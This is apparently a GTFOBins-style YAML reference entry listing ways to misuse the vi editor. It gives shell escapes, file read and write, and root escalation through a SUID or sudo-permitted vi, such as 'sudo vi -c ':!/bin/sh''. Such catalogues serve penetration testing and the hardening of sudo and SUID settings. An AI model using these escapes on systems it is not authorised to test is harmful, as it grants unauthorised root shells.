---
functions:
  shell:
    - code: vi -c ':!/bin/sh'
    - code: |
        vi
        :set shell=/bin/sh
        :shell
    - code: vi -c ':py import os;os.system("sh")'
  file-write:
    - code: |
        vi file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: vi file_to_read
  suid:
    - code: ./vi -c ':!/bin/sh -p'
  sudo:
    - code: sudo vi -c ':!/bin/sh'
    - code: sudo vi -c ':py import os;os.system("sh")'
---
